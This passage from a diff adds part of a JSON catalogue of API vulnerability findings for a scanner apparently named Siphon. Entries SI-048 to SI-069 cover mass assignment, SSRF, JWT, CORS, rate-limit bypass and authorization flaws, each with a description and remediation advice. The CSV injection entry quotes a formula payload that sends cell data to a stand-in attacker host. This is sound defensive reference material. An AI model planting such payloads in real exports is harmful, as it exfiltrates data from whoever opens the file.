+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-048",
+    "title": "Possible Mass Assignment \u2014 Response Differs",
+    "severity": "MEDIUM",
+    "category": "Mass Assignment",
+    "owasp_api": "API6:2023 Unrestricted Access to Sensitive Business Flows",
+    "owasp_web": "A04:2021 Insecure Design",
+    "nist": [
+      "AC-3",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+    "description": "Siphon detected that submitting additional or undocumented fields in an API request body produces a different response (e.g., different status code, different response body structure, or modified resource state) compared to the baseline request without those fields. This behavioral difference suggests the application is processing the injected fields, which is a strong indicator of a mass assignment vulnerability. Full exploitation requires manual confirmation of which fields can be manipulated.",
+    "remediation": "Implement an explicit allowlist of accepted fields for each API endpoint. Use Data Transfer Objects (DTOs) or serialization schemas that only map documented fields, ignoring all others. Never bind request body data directly to model objects without filtering. Audit all API endpoints that accept PATCH or PUT requests for mass assignment susceptibility.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/",
+      "https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability"
+    ]
+  },
+  {
+    "id": "SI-049",
+    "title": "Possible SSRF \u2014 Delayed Response",
+    "severity": "MEDIUM",
+    "category": "SSRF",
+    "owasp_api": "API7:2023 Server Side Request Forgery",
+    "owasp_web": "A10:2021 Server-Side Request Forgery",
+    "nist": [
+      "AC-4",
+      "SC-7",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 5.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+    "description": "Siphon observed a significant and consistent response delay when injecting an internal or external URL into an API parameter, suggesting the server is fetching the supplied URL before responding. This timing-based indicator is consistent with Server-Side Request Forgery (SSRF) behavior where the server makes outbound connections based on attacker-supplied URLs. SSRF can be used to probe internal network services, access cloud metadata endpoints (e.g., 169.254.169.254), or pivot to internal systems. Manual confirmation is required to determine exploitability.",
+    "remediation": "Validate all URL parameters against an allowlist of permitted schemes and destination hosts before making any outbound request. Block requests to private IP ranges (RFC 1918), link-local addresses, and cloud metadata endpoints. Implement a server-side HTTP client that enforces timeouts and restricts redirects. Log all outbound HTTP requests for monitoring purposes.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/ssrf",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/"
+    ]
+  },
+  {
+    "id": "SI-050",
+    "title": "JWT Uses Symmetric Algorithm (HS256)",
+    "severity": "MEDIUM",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-28"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",
+    "description": "The API issues JWTs signed with a symmetric HMAC algorithm (HS256, HS384, or HS512). Symmetric algorithms use the same secret key for signing and verification, meaning any party that can verify tokens also knows the secret and can forge arbitrary tokens. In microservice architectures where multiple services verify JWTs, each service possesses the signing secret, increasing the blast radius if any service is compromised. A weak or brute-forceable HMAC secret compounds this risk significantly.",
+    "remediation": "Migrate to asymmetric signing algorithms (RS256, ES256, or PS256) where the signing key is known only to the issuer and verification uses the corresponding public key. If symmetric algorithms must be retained, use a cryptographically strong, randomly generated secret of at least 256 bits. Rotate the signing secret periodically. Store the secret in a secrets management system, not in configuration files.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/algorithm-confusion",
+      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-051",
+    "title": "Security Misconfiguration / CORS Wildcard with Credentials",
+    "severity": "HIGH",
+    "category": "CORS",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "AC-4",
+      "SC-8"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The API responds with Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials: true simultaneously. While modern browsers reject this combination per the CORS specification, the configuration reveals a misunderstanding of CORS security semantics. Additionally, some non-browser clients and legacy implementations may not enforce this restriction. The intended behavior (wildcard origin with credentials) would allow any origin to make authenticated cross-origin requests, effectively neutralizing same-origin protection for authenticated API calls.",
+    "remediation": "Never set Access-Control-Allow-Origin to '*' in combination with Access-Control-Allow-Credentials: true. For endpoints requiring credentialed cross-origin access, maintain an explicit allowlist of trusted origins and dynamically reflect the request origin only when it matches the allowlist. Remove the wildcard and configure a specific origin allowlist.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/cors",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-052",
+    "title": "Sensitive Credentials Transmitted in URL Query Parameters",
+    "severity": "HIGH",
+    "category": "Information Disclosure",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-8",
+      "AU-3"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The API transmits sensitive credentials (API keys, tokens, passwords, or session identifiers) in URL query parameters rather than in request headers or the request body. URL query parameters are stored in browser history, web server access logs, proxy logs, and Referer headers sent to third parties. Credentials embedded in URLs are frequently exposed through log aggregation systems, CDN log exports, and browser history synchronization, creating multiple persistent exposure vectors.",
+    "remediation": "Transmit all credentials and sensitive tokens in HTTP request headers (Authorization, X-API-Key) or in the request body (for POST/PUT requests). Never include credentials in URL query parameters. Review all API endpoints for credential leakage via URL parameters. Rotate any credentials that have been transmitted in URLs as they should be considered compromised.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://portswigger.net/web-security/authentication"
+    ]
+  },
+  {
+    "id": "SI-053",
+    "title": "Debug / Developer Console Exposed",
+    "severity": "HIGH",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7",
+      "AC-3"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "Siphon detected an accessible debug or developer console endpoint (e.g., /debug, /console, /__debug__, /flask-debugger, Spring Boot Actuator /actuator/env, Django admin, Werkzeug interactive debugger). Debug consoles typically provide arbitrary code execution capabilities, full environment variable disclosure (including secrets), SQL query execution, and live configuration inspection. An unauthenticated debug console is a critical severity finding and provides immediate full system compromise.",
+    "remediation": "Immediately disable all debug endpoints in production deployments. Use environment-specific configuration to ensure debug modes are only enabled in development environments. Remove all debug middleware and interactive debuggers from production builds. Implement access controls on any remaining diagnostic endpoints (e.g., Spring Boot Actuator) to restrict them to authenticated administrators on internal networks only.",
+    "metasploit": [
+      "auxiliary/scanner/http/werkzeug_debug_rce"
+    ],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/",
+      "https://portswigger.net/web-security/information-disclosure",
+      "https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints"
+    ]
+  },
+  {
+    "id": "SI-054",
+    "title": "Server-Timing Header Leaks Authentication Duration",
+    "severity": "MEDIUM",
+    "category": "Information Disclosure",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "SC-8",
+      "IA-5"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API includes a Server-Timing header in authentication responses that reveals internal timing information such as database query duration or credential validation time. By comparing response times for valid versus invalid usernames, an attacker can perform a timing-based user enumeration attack. Differences in authentication timing (e.g., a valid username with wrong password taking longer than an invalid username) can also confirm account existence without triggering lockout mechanisms.",
+    "remediation": "Remove the Server-Timing header from authentication endpoint responses. If Server-Timing is required for performance monitoring, restrict it to internal networks or authenticated requests only. Implement constant-time comparison for credential validation to eliminate timing side-channels. Ensure authentication responses for valid and invalid credentials take equivalent time by adding artificial delays where necessary.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server-Timing",
+      "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-055",
+    "title": "API Returns More Fields Than Documented",
+    "severity": "MEDIUM",
+    "category": "Excessive Data Exposure",
+    "owasp_api": "API3:2023 Broken Object Property Level Authorization",
+    "owasp_web": null,
+    "nist": [
+      "AC-3",
+      "AC-4",
+      "SI-12"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API endpoint returns more fields in its response than are documented in the API specification. The extra fields may contain internal identifiers, system metadata, hidden status flags, or other data not intended for client consumption. When the undocumented fields are sensitive (e.g., password hashes, internal user IDs, role flags, tokens), this finding escalates to Excessive Data Exposure. Even non-sensitive undocumented fields represent a schema drift risk and documentation gap.",
+    "remediation": "Implement explicit response serialization/marshaling that only includes fields defined in the API specification. Use response DTOs or serialization schemas to filter the response object before returning it. Review all undocumented fields for sensitivity. Update the API specification to formally document any fields that should be exposed, or remove them from responses.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-056",
+    "title": "HTTP Method Override \u2014 DELETE via POST Accepted",
+    "severity": "MEDIUM",
+    "category": "Security Misconfiguration",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7",
+      "AC-3"
+    ],
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L",
+    "description": "The API accepts HTTP method overrides via the X-HTTP-Method-Override or X-Method-Override header, allowing a POST request to be processed as a DELETE, PUT, or PATCH. Method override support was originally designed for environments where only GET and POST are supported. If the API applies authorization controls based on HTTP method at the routing layer, an attacker may bypass these controls by using POST with a method override header to perform DELETE or other privileged operations.",
+    "remediation": "Disable HTTP method override support unless strictly required for legacy client compatibility. If method override must be supported, ensure that authorization controls are applied based on the effective (overridden) method, not the HTTP transport method. Restrict which methods can be overridden and log all override usage.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-057",
+    "title": "CSV Injection in User Export",
+    "severity": "MEDIUM",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 5.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N",
+    "description": "The API's data export endpoint includes user-supplied values in CSV output without sanitization. Spreadsheet applications (Excel, LibreOffice Calc, Google Sheets) interpret cell values beginning with '=', '+', '-', or '@' as formulas. An attacker can inject formula payloads (e.g., =HYPERLINK(\"http://attacker.com/?\"&A1)) that execute when an administrator or staff member opens the exported CSV, potentially exfiltrating data from the spreadsheet or executing arbitrary commands if Dynamic Data Exchange (DDE) is enabled.",
+    "remediation": "Prefix all user-supplied cell values in CSV exports with a single quote character to prevent formula injection. Alternatively, reject or escape cells that begin with formula-triggering characters. Warn users in the API documentation that exported data should not be opened with formula execution enabled. Consider using XLSX format with explicit cell type enforcement instead of CSV.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-community/attacks/CSV_Injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/CSV_Injection_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-058",
+    "title": "Business Flow \u2014 Numeric Field Accepts Negative/Zero Value",
+    "severity": "MEDIUM",
+    "category": "Business Logic",
+    "owasp_api": "API6:2023 Unrestricted Access to Sensitive Business Flows",
+    "owasp_web": "A04:2021 Insecure Design",
+    "nist": [
+      "SI-10",
+      "AC-3"
+    ],
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    "description": "Siphon detected that an API endpoint accepting a numeric field (e.g., quantity, amount, price, discount) processes negative or zero values without validation. Accepting negative values in financial or inventory contexts can enable attacks such as transferring negative amounts (effectively receiving funds), adding negative quantities to a cart (to subtract price), applying discounts greater than 100%, or bypassing minimum purchase requirements. This class of business logic flaw is commonly exploited in e-commerce and fintech APIs.",
+    "remediation": "Implement server-side validation that enforces minimum value constraints for all numeric fields (e.g., quantity >= 1, amount > 0). Do not rely on client-side validation alone. Review each numeric field to determine appropriate bounds and implement both minimum and maximum value checks. Specifically test for integer overflow conditions when large positive values are submitted.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits"
+    ]
+  },
+  {
+    "id": "SI-059",
+    "title": "Missing Security Header: Strict-Transport-Security",
+    "severity": "HIGH",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A02:2021 Cryptographic Failures",
+    "nist": [
+      "CM-6",
+      "SC-8",
+      "SC-28"
+    ],
+    "cves": [],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The API does not include a Strict-Transport-Security (HSTS) header in its responses. Without HSTS, browsers do not enforce HTTPS connections to the API and will follow HTTP redirects or accept HTTP responses. This enables SSL stripping attacks where a network-positioned attacker downgrades the connection from HTTPS to HTTP, intercepting all API traffic including authentication tokens, session cookies, and sensitive data in transit. APIs accessible over both HTTP and HTTPS without HSTS are especially vulnerable.",
+    "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to all HTTPS responses. Ensure the API is only served over HTTPS and redirect all HTTP requests to HTTPS before setting the HSTS header. Consider submitting the domain to the HSTS preload list at https://hstspreload.org. Never set HSTS on HTTP responses as this provides no protection and can cause access issues.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html",
+      "https://hstspreload.org/",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-060",
+    "title": "BOLA \u2014 Object Enumeration Possible",
+    "severity": "HIGH",
+    "category": "Broken Object Level Authorization",
+    "owasp_api": "API1:2023 Broken Object Level Authorization",
+    "owasp_web": "A01:2021 Broken Access Control",
+    "nist": [
+      "AC-3",
+      "AC-4"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The API uses predictable, sequential, or guessable object identifiers (e.g., integer IDs: /api/orders/1001, /api/orders/1002) in resource URLs. While a full BOLA exploit requires the server to return another user's resource without authorization checks, predictable IDs enable automated enumeration of valid resource identifiers. An attacker can iterate through ID ranges to discover valid object IDs before exploiting missing authorization checks. This finding is a prerequisite for BOLA (SI-076) exploitation.",
+    "remediation": "Replace sequential integer IDs with cryptographically random UUIDs (UUIDv4) or other non-enumerable identifiers. Implement object-level authorization checks on every endpoint regardless of ID type \u2014 do not rely on unguessable IDs as a substitute for authorization. Combine opaque IDs with server-side ownership validation.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
+      "https://portswigger.net/web-security/access-control/idor"
+    ]
+  },
+  {
+    "id": "SI-061",
+    "title": "BFLA \u2014 Broken Function Level Authorization",
+    "severity": "HIGH",
+    "category": "Broken Function Level Authorization",
+    "owasp_api": "API5:2023 Broken Function Level Authorization",
+    "owasp_web": "A01:2021 Broken Access Control",
+    "nist": [
+      "AC-3",
+      "AC-6"
+    ],
+    "cves": [],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed that an API endpoint intended for a higher-privileged role (e.g., manager, moderator) is accessible by a lower-privileged authenticated user (horizontal privilege escalation). The server does not enforce function-level authorization checks at the endpoint, relying instead on the client to present appropriate UI. An attacker can directly call the restricted endpoint using their own valid credentials to perform actions beyond their assigned role.",
+    "remediation": "Implement server-side function-level authorization checks on every endpoint based on the authenticated user's role and permissions. Apply the principle of least privilege: default to denying access and explicitly grant access to each role per endpoint. Use a centralized authorization framework rather than per-endpoint conditional logic. Regularly test authorization controls with each defined role.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/",
+      "https://portswigger.net/web-security/access-control",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-062",
+    "title": "Excessive Data Exposure \u2014 Sensitive Fields in API Response",
+    "severity": "HIGH",
+    "category": "Excessive Data Exposure",
+    "owasp_api": "API3:2023 Broken Object Property Level Authorization",
+    "owasp_web": "A02:2021 Cryptographic Failures",
+    "nist": [
+      "AC-3",
+      "AC-4",
+      "SC-28"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The API response includes sensitive fields that should not be returned to the requesting client, such as password hashes, password reset tokens, SSNs, credit card numbers, internal system identifiers, private keys, secret tokens, or overly detailed PII. The API returns a serialized object without filtering sensitive fields, relying on the client to ignore them. An attacker who can read API responses (or who intercepts them) gains access to this sensitive data directly.",
+    "remediation": "Implement explicit response serialization that only returns fields the requesting client is authorized to receive. Use response DTOs, @JsonIgnore annotations, or serialization group mechanisms to exclude sensitive fields. Never return password hashes, plaintext passwords, tokens, or private key material in any API response. Conduct a data classification review of all API response schemas.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-063",
+    "title": "Cross-User Data Leakage",
+    "severity": "HIGH",
+    "category": "Broken Object Level Authorization",
+    "owasp_api": "API1:2023 Broken Object Level Authorization",
+    "owasp_web": "A01:2021 Broken Access Control",
+    "nist": [
+      "AC-3",
+      "AC-4"
+    ],
+    "cves": [],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "description": "Siphon confirmed that an authenticated API endpoint returns data belonging to another user when a different user's resource ID is specified. The server does not validate that the authenticated user is the owner of or has permission to access the requested resource. This is a confirmed Broken Object Level Authorization (BOLA/IDOR) vulnerability allowing horizontal privilege escalation and direct cross-user data access.",
+    "remediation": "Implement ownership validation on every endpoint that accesses user-specific resources. Verify that the authenticated user ID matches the owner of the requested resource. Do not rely on the client to supply the correct user ID \u2014 derive the target user from the authenticated session, not from URL parameters or request body. Implement comprehensive integration tests for authorization across all user-scoped endpoints.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
+      "https://portswigger.net/web-security/access-control/idor",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-064",
+    "title": "Sensitive Data Exposed in API Response",
+    "severity": "HIGH",
+    "category": "Information Disclosure",
+    "owasp_api": "API3:2023 Broken Object Property Level Authorization",
+    "owasp_web": "A02:2021 Cryptographic Failures",
+    "nist": [
+      "AC-3",
+      "SC-28",
+      "SI-12"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The API response contains sensitive data including but not limited to: full payment card numbers or PAN data, government-issued ID numbers, medical or health records, private cryptographic material, authentication credentials, or other regulated/sensitive personal information. This data is returned as part of the standard API response to the client, creating unnecessary exposure. Even if HTTPS is in use, returning sensitive data to clients that do not need it violates data minimization principles and increases breach impact.",
+    "remediation": "Apply data minimization: only return the minimum data the client requires to fulfill its function. Mask or truncate sensitive fields (e.g., return last four digits of a card number only). Implement field-level access control so that sensitive fields are only returned to clients with explicit permission. Conduct a data sensitivity audit of all API response schemas against regulatory requirements (PCI-DSS, HIPAA, GDPR).",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-065",
+    "title": "Sensitive Authentication Headers Exposed in Response",
+    "severity": "HIGH",
+    "category": "Information Disclosure",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-8"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The API response headers expose sensitive authentication material such as internal API keys, bearer tokens, session identifiers, or HMAC signing secrets. These values may appear in custom response headers, debug headers, or be reflected back from request headers without sanitization. An attacker who can read response headers from any position in the network path (e.g., via a proxy, CDN logging, or XSS) can extract these credentials for further exploitation.",
+    "remediation": "Audit all API response headers and remove any that contain authentication credentials, tokens, or secrets. Ensure response headers are generated from server-side configuration, not by reflecting request headers. Review logging pipelines to ensure response headers containing credentials are not captured in logs. Rotate any credentials that have been exposed in response headers.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://portswigger.net/web-security/authentication"
+    ]
+  },
+  {
+    "id": "SI-066",
+    "title": "Missing Rate Limiting",
+    "severity": "HIGH",
+    "category": "Rate Limiting",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
+    "description": "The API endpoint does not enforce any rate limiting on incoming requests. An attacker can send unlimited requests to this endpoint, enabling brute-force attacks against authentication endpoints, enumeration of valid resource IDs, credential stuffing attacks, scraping of all accessible data, or resource exhaustion (denial-of-service) through compute-intensive operations. The absence of rate limiting is particularly critical on authentication, password reset, OTP, and search endpoints.",
+    "remediation": "Implement rate limiting on all API endpoints, with stricter limits on authentication-related endpoints. Define rate limit policies based on IP address, API key, and authenticated user. Return 429 Too Many Requests with a Retry-After header when limits are exceeded. Use a rate limiting middleware or API gateway feature rather than application-level implementation. Implement exponential backoff enforcement for repeated authentication failures.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-067",
+    "title": "Rate Limit Bypass \u2014 Unauthenticated Session Has Separate Bucket",
+    "severity": "HIGH",
+    "category": "Rate Limiting",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "IA-5"
+    ],
+    "cves": [],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed a rate limit bypass where requests made without authentication (or with a different credential type) are tracked in a separate rate limit bucket from authenticated requests. An attacker can exploit this by alternating between authenticated and unauthenticated sessions, or by registering multiple accounts to obtain separate rate limit buckets. This effectively multiplies the number of attempts available, enabling brute-force or credential stuffing attacks that would otherwise be blocked by per-credential rate limits.",
+    "remediation": "Implement rate limiting that aggregates request counts by IP address regardless of authentication state. Ensure that unauthenticated requests to sensitive endpoints (login, password reset, OTP) are subject to strict rate limits. Track failed authentication attempts by IP address and target account, locking or challenging both dimensions when thresholds are exceeded.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-068",
+    "title": "Rate Limit Bypass via X-Forwarded-For Header",
+    "severity": "HIGH",
+    "category": "Rate Limiting",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed that the API's rate limiting can be bypassed by injecting arbitrary IP addresses into the X-Forwarded-For, X-Real-IP, or CF-Connecting-IP headers. The application trusts these headers unconditionally and uses the value as the client IP for rate limit bucket assignment. An attacker can rotate the X-Forwarded-For value on each request to bypass per-IP rate limits entirely, enabling unlimited brute-force and enumeration attacks.",
+    "remediation": "Do not use untrusted client-supplied IP headers for rate limiting or security enforcement. Only extract the real client IP from X-Forwarded-For when the request originates from a trusted proxy or load balancer (validate by source IP). Configure the proxy to set the client IP header and strip any client-supplied values before forwarding. Use the connection IP (socket-level IP) when no trusted proxy layer is present.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
+      "https://portswigger.net/web-security/authentication/password-based",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-069",
+    "title": "Mass Assignment Vulnerability",
+    "severity": "HIGH",
+    "category": "Mass Assignment",
+    "owasp_api": "API6:2023 Unrestricted Access to Sensitive Business Flows",
+    "owasp_web": "A04:2021 Insecure Design",
+    "nist": [
+      "AC-3",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed a mass assignment vulnerability where injecting undocumented fields (e.g., role, isAdmin, accountBalance, verified, subscription_tier) in the API request body results in those fields being written to the underlying data model. The application binds request body parameters directly to model objects without an explicit allowlist. An attacker can escalate privileges, modify protected fields, or alter business-critical data by including these fields in standard API requests.",
+    "remediation": "Never bind request body data directly to model objects. Use Data Transfer Objects (DTOs) with explicit field mappings for each endpoint. Implement an allowlist of fields that each endpoint is permitted to modify. Mark sensitive model fields (role, isAdmin, balance) with @ReadOnly or equivalent annotations to prevent them from being modified via API binding. Conduct a full audit of all PATCH and PUT endpoints.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
